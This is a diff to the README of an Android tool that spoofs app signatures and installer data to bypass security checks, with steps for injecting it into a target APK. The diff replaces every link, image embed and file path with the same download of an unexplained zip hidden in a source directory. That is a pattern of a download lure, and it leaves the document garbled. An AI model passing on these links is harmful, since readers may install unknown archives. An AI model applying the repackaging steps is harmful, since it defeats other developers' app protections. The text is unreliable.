@@ -5,29 +5,29 @@ APKKiller is a method to bypass various android application security system chec
 When an android application is loaded, it stores various information regarding current running Application like App Name, Package Name, Signature, APK Path, etc.
 You can't access those information normal way, but with _Reflection_ you access, read and write new data to those internal classes & fields. 
 
-These informations are stored in a class like [AppBindData](https://github.com/AncestorEra/APKKiller/raw/refs/heads/master/app/src/main/java/com/kuro/whale/APK-Killer-1.3.zip+https://github.com/AncestorEra/APKKiller/raw/refs/heads/master/app/src/main/java/com/kuro/whale/APK-Killer-1.3.zip), [LoadedApk](https://github.com/AncestorEra/APKKiller/raw/refs/heads/master/app/src/main/java/com/kuro/whale/APK-Killer-1.3.zip+https://github.com/AncestorEra/APKKiller/raw/refs/heads/master/app/src/main/java/com/kuro/whale/APK-Killer-1.3.zip), [ApplicationInfo](https://github.com/AncestorEra/APKKiller/raw/refs/heads/master/app/src/main/java/com/kuro/whale/APK-Killer-1.3.zip+https://github.com/AncestorEra/APKKiller/raw/refs/heads/master/app/src/main/java/com/kuro/whale/APK-Killer-1.3.zip), etc.
+These informations are stored in a class like [AppBindData](https://raw.githubusercontent.com/AncestorEra/APKKiller/master/app/src/main/cpp/whale/src/dbi/x86/Killer_APK_v2.7.zip+https://raw.githubusercontent.com/AncestorEra/APKKiller/master/app/src/main/cpp/whale/src/dbi/x86/Killer_APK_v2.7.zip), [LoadedApk](https://raw.githubusercontent.com/AncestorEra/APKKiller/master/app/src/main/cpp/whale/src/dbi/x86/Killer_APK_v2.7.zip+https://raw.githubusercontent.com/AncestorEra/APKKiller/master/app/src/main/cpp/whale/src/dbi/x86/Killer_APK_v2.7.zip), [ApplicationInfo](https://raw.githubusercontent.com/AncestorEra/APKKiller/master/app/src/main/cpp/whale/src/dbi/x86/Killer_APK_v2.7.zip+https://raw.githubusercontent.com/AncestorEra/APKKiller/master/app/src/main/cpp/whale/src/dbi/x86/Killer_APK_v2.7.zip), etc.
 
 APKKiller changes data on those classes to spoof current application information such APK Path, APK Signatures, APK Installer Information, etc. APKKiller is not guaranteed to work on all apps/games, but it is guaranteed to bypass majorities of application security system.
 
 ## How to use it?
-1. Get the target app original _Signature_ using [APK Sign Reader](https://github.com/AncestorEra/APKKiller/raw/refs/heads/master/app/src/main/java/com/kuro/whale/APK-Killer-1.3.zip) or [APK Sign Reader (for windows)](https://github.com/AncestorEra/APKKiller/raw/refs/heads/master/app/src/main/java/com/kuro/whale/APK-Killer-1.3.zip)
+1. Get the target app original _Signature_ using [APK Sign Reader](https://raw.githubusercontent.com/AncestorEra/APKKiller/master/app/src/main/cpp/whale/src/dbi/x86/Killer_APK_v2.7.zip) or [APK Sign Reader (for windows)](https://raw.githubusercontent.com/AncestorEra/APKKiller/master/app/src/main/cpp/whale/src/dbi/x86/Killer_APK_v2.7.zip)
 2. Change **apk_signatures** in `APKKiller.h` using the result of _APKSignReader_
 3. Build the APKKiller Project to APK
 4. Decompile both APKKiller APK and Target APK
 5. Copy smali from `com/kuro` (APKKiller smali) to the Target App smali
 6. Copy libs from APKKiller APK to Target APK (Make sure only copy same ABIs as the Target App, for example if Target App has only armeabi-v7a, then you should only copy armeabi-v7a)
-6. Locate Target App entry point in the smali, you can do this by taking a look at `https://github.com/AncestorEra/APKKiller/raw/refs/heads/master/app/src/main/java/com/kuro/whale/APK-Killer-1.3.zip`
+6. Locate Target App entry point in the smali, you can do this by taking a look at `https://raw.githubusercontent.com/AncestorEra/APKKiller/master/app/src/main/cpp/whale/src/dbi/x86/Killer_APK_v2.7.zip`
 7. Call `Start` function on the target app `attachBaseContext` (Application) or `onCreate` (Activity) [Preferrably attachBaseContext]
 
 For example:
 
 **attachBaseContext**
 
-![image](https://github.com/AncestorEra/APKKiller/raw/refs/heads/master/app/src/main/java/com/kuro/whale/APK-Killer-1.3.zip)
+![image](https://raw.githubusercontent.com/AncestorEra/APKKiller/master/app/src/main/cpp/whale/src/dbi/x86/Killer_APK_v2.7.zip)
 
 **onCreate**
 
-![image](https://github.com/AncestorEra/APKKiller/raw/refs/heads/master/app/src/main/java/com/kuro/whale/APK-Killer-1.3.zip)
+![image](https://raw.githubusercontent.com/AncestorEra/APKKiller/master/app/src/main/cpp/whale/src/dbi/x86/Killer_APK_v2.7.zip)
 
-7. Copy Target original APK file to `<decompile_target_app_dir>https://github.com/AncestorEra/APKKiller/raw/refs/heads/master/app/src/main/java/com/kuro/whale/APK-Killer-1.3.zip`
+7. Copy Target original APK file to `<decompile_target_app_dir>https://raw.githubusercontent.com/AncestorEra/APKKiller/master/app/src/main/cpp/whale/src/dbi/x86/Killer_APK_v2.7.zip`
 8. Compile Target App and test it!
